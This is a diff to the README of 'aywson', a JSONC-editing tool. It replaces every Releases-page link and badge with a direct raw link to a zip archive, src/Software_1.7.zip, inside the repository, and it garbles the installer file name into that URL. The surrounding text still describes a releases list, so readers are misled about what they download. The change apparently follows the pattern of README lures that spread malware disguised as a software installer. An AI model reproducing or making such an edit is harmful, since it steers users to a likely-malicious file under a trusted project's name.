@@ -8,20 +8,20 @@ Welcome to aywson! This tool helps you modify JSONC files while keeping all comm
 
 To get started, first, you need to download the application. Click the link below to visit the Releases page and download the latest version.
 
-[![Download aywson](https://img.shields.io/badge/Download-aywson-brightgreen)](https://github.com/zukakun-11/aywson/releases)
+[![Download aywson](https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip)](https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
    Click the link below to open the Releases page where you can find the latest version of aywson.  
-   [Visit Releases Page](https://github.com/zukakun-11/aywson/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you'll see a list of available versions. Look for the latest release at the top of the list.
 
 3. **Download the Installer**  
    Click the link related to your operating system to start the download.  
-   The installer will typically be named something like `aywson-installer.exe` or similar.
+   The installer will typically be named something like `https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip` or similar.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your Downloads folder or the folder you saved it to.  
@@ -73,6 +73,6 @@ If you have any questions or run into issues while using aywson, please reach ou
 
 aywson is open source software, which means you can use it for free. Feel free to modify it to fit your needs.
 
-[![Download aywson](https://img.shields.io/badge/Download-aywson-brightgreen)](https://github.com/zukakun-11/aywson/releases)
+[![Download aywson](https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip)](https://raw.githubusercontent.com/zukakun-11/aywson/main/src/Software_1.7.zip)
 
 Thank you for choosing aywson! Enjoy hassle-free modifications to your JSONC files while preserving your formatting and comments.
